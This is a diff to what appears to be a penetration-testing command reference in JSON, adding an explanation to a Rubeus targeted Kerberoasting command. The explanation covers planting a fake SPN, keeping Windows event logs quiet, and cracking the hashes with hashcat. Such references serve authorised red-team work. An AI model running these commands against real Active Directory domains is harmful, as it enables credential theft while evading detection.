@@ -98,5 +98,6 @@
       "label": "OPSEC single user",
       "command": ".\\Rubeus.exe kerberoast /user:<user> /rc4opsec /nowrap /outfile:hash.txt"
     }
-  ]
+  ],
+  "explain": "Roasts one specific SPN account (targeted or quiet Kerberoasting):\n  kerberoast               request a TGS for cracking\n  /user:<user>             only this account (e.g. after planting a fake SPN via GenericWrite)\n  /nowrap                  print the hash on one line\nGenerates a single Event 4769 instead of one per SPN, so it is far quieter than bulk roasting; crack with hashcat -m 13100."
 }
